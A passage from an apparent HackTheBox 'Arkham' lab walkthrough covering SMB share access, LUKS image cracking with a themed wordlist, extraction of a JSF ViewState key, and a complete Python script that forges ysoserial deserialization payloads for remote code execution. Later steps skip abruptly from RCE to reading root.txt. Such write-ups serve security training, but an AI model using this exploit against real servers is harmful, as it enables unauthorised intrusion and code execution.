That is where we go next.</p><p>Smbclient -N //10.129.228.116/BatShare</p><p>Inside, we find a single archive:</p><p>Smb: \&gt; ls<br>&nbsp;appserver.zip A 4046695</p><p>Smb: \&gt; get appserver.zip</p><p>Extracting it reveals two files: IMPORTANT.txt (a note from Bruce to Alfred about a Linux backup) and backup.img.</p><p>File backup.img<br># backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256]</p><figure><img src="/writing/media/2332d58bfa64c86a198a2940.webp" alt="HackTheBox “Arkham” Walkthrough, figure 3" width="1200" height="427" loading="lazy" decoding="async"></figure><h2 id="phase-3-cracking-the-luks-image">Phase 3: Cracking the LUKS Image</h2><p>LUKS is designed to be slow. Brute-forcing the entire rockyou.txt list at roughly 16 attempts per second would take days. We need a smarter approach.</p><p>This is where theme awareness pays off. The share is BatShare. The note mentions Bruce and Alfred. The comment says "Master Wayne." A Batman-themed wordlist is the obvious move.</p><p>Grep -i batman /usr/share/wordlists/rockyou.txt &gt; batman.txt<br>wc -l batman.txt<br># ~900 passwords</p><p>Then crack with bruteforce-luks:</p><p>Bruteforce-luks -t 4 -f batman.txt -v 10 backup.img</p><p>Password found: batmanforever</p><p>With the passphrase, we open the image:</p><p>Sudo cryptsetup luksOpen backup.img arkham_backup<br>sudo mount /dev/mapper/arkham_backup /mnt<br>ls /mnt/Mask/</p><p>Inside we find the useful files: tomcat-stuff/, including a web.xml.bak file.</p><figure><img src="/writing/media/77e3f158bef39bca9ff3a100.webp" alt="HackTheBox “Arkham” Walkthrough, figure 4" width="1196" height="1054" loading="lazy" decoding="async"></figure><p>Cat /mnt/Mask/tomcat-stuff/web.xml.bak</p><p>Key contents:</p><p>&lt;param-name&gt;org.apache.myfaces.SECRET&lt;/param-name&gt;<br>&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;</p><p>&lt;param-name&gt;org.apache.myfaces.MAC_ALGORITHM&lt;/param-name&gt;<br>&lt;param-value&gt;HmacSHA1&lt;/param-value&gt;</p><p>&lt;param-name&gt;org.apache.myfaces.MAC_SECRET&lt;/param-name&gt;<br>&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;</p><figure><img src="/writing/media/040e82d558398992bc33813c.webp" alt="HackTheBox “Arkham” Walkthrough, figure 5" width="1200" height="1053" loading="lazy" decoding="async"></figure><p>Decode the secret:</p><p>Echo "SnNGOTg3Ni0=" | base64 -d<br># JsF9876-</p><p>This is the server's JSF ViewState signing and encryption key. With it, we can forge arbitrary ViewStates.</p><figure><img src="/writing/media/55bc960001b14e4db9954343.webp" alt="HackTheBox “Arkham” Walkthrough, figure 6" width="598" height="120" loading="lazy" decoding="async"></figure><h2 id="phase-4-jsf-viewstate-deserialization-rce">Phase 4: JSF ViewState Deserialization RCE</h2><p>What is JSF ViewState?</p><p>JavaServer Faces (JSF) stores page state in a serialized base64 blob called the ViewState. When the user submits a form, the server deserializes that blob to reconstruct the page.</p><p>Java deserialization of untrusted data is a well-known path to Remote Code Execution. Normally, the ViewState is protected by encryption and HMAC signing - so clients cannot tamper with it. But we just extracted the key.</p><p>The ViewState Crypto Structure</p><p>Base64( DES_ECB_encrypt(payload) + HMAC_SHA1(encrypted_payload) )</p><p>- Encryption: DES-ECB with key JsF9876-<br>- MAC: HmacSHA1 with key JsF9876-<br>- MAC appended as the last 20 bytes</p><p>Building the Exploit</p><p>We use ysoserial to generate a malicious serialized Java object. The gadget chain CommonsCollections5 works with Apache Commons Collections 3.x, which Tomcat 8.5.37 ships with.</p><p>Environment setup:</p><pre><code data-language="text">wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar \ -O /opt/ysoserial.jarpip install pycryptodome - break-system-packagesysoserial needs Java 8-11. On this ARM64 Kali machine, use Java 11 explicitly:/usr/lib/jvm/java-11-openjdk-arm64/bin/java -version</code></pre><p>Here is the exploit script that forges and submits the malicious ViewState:</p><pre><code data-language="text">#!/usr/bin/env python3import requestsimport subprocessimport sysfrom base64 import b64encodefrom Crypto.Cipher import DESfrom Crypto.Hash import SHA, HMACfrom os import devnullJAVA = '/usr/lib/jvm/java-11-openjdk-arm64/bin/java'YSOSERIAL = '/opt/ysoserial.jar'TARGET = 'http://10.129.228.116:8080/userSubscribe.faces'KEY = b'JsF9876-'cmd = sys.argv[1]with open(devnull, 'w') as null: payload = subprocess.check_output( [JAVA, '-jar', YSOSERIAL, 'CommonsCollections5', cmd], stderr=null )pad = (8 - (len(payload) % 8)) % 8padded = payload + (chr(pad) * pad).encode()d = DES.new(KEY, DES.MODE_ECB)enc_payload = d.encrypt(padded)sig = HMAC.new(KEY, enc_payload, SHA).digest()viewstate = b64encode(enc_payload + sig)sess = requests.session()sess.get(TARGET)sess.post(TARGET, data={ 'j_id_jsp_1623871077_1%3Aemail': 'd', 'j_id_jsp_1623871077_1%3Asubmit': 'SIGN+UP', 'j_id_jsp_1623871077_1_SUBMIT': '1', 'javax.faces.ViewState': viewstate})print("[+] Payload sent")</code></pre><p>Pro Tip: Ping Before Shell</p><p>Before throwing a reverse shell, verify execution with something observable:</p><p>Terminal 1:<br>sudo tcpdump -i tun0 icmp</p><p>Terminal 2:<br>python3 exploit.py "ping -n 2 10.10.16.84"</p><p>A successful ping confirms the deserialization chain works, outbound traffic reaches you, and the only remaining variable is the shell itself.</p><figure><img src="/writing/media/367a09d82f66034eceeaf457.webp" alt="HackTheBox “Arkham” Walkthrough, figure 7" width="762" height="164" loading="lazy" decoding="async"></figure><figure><img src="/writing/media/bb9a09930cdefb6a5389b2e1.webp" alt="HackTheBox “Arkham” Walkthrough, figure 8" width="1200" height="259" loading="lazy" decoding="async"></figure><h2 id="phase-5-shell-as-alfred-and-the-user-flag">Phase 5: Shell as Alfred and the User Flag</h2><p>With RCE confirmed, we drop a Windows netcat binary. Windows UAC filters admin tokens by default.</p><p>C:\&gt; type C:\Users\Administrator\Desktop\root.txt</p><figure><img src="/writing/media/55f76c08c6acd3277994e045.webp" alt="HackTheBox “Arkham” Walkthrough, figure 22" width="1200" height="755" loading="lazy" decoding="async"></figure><p>Review notes</p><p>1. Anonymous SMB access is still a critical foothold. One misconfigured share handed us a full server backup.<br>2. Backups are dangerous.
